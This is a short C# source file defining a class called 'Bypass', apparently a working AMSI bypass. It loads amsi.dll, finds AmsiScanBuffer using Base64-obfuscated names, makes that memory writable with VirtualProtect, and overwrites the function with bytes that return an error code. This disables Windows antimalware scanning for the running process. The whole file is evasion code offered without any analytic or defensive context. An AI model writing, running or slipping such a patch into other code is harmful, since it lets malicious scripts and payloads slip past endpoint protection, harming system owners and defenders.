using System;
using System.Runtime.InteropServices;
using System.Text;

public class Bypass
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procname);

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpfOldPRotect);

    public static string Base64Decode(string base64EncodeData)
    {
        var base64bytes = Convert.FromBase64String(base64EncodeData);
        return Encoding.UTF8.GetString(base64bytes);
    }

    public static void amsi()
    {
        byte[] patchBytes = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 80070057h
                                                                               // return
        var lib = LoadLibrary(Base64Decode("YW1zaS5kbGw=")); //amsi.dll
        var addr = GetProcAddress(lib, Base64Decode("QW1zaVNjYW5CdWZmZXI=")); //AmsiScanBuffer

        uint oldProtect;
        VirtualProtect(addr, (UIntPtr)patchBytes.Length, 0x40, out oldProtect);

        Marshal.Copy(patchBytes, 0, addr, patchBytes.Length);
    }
}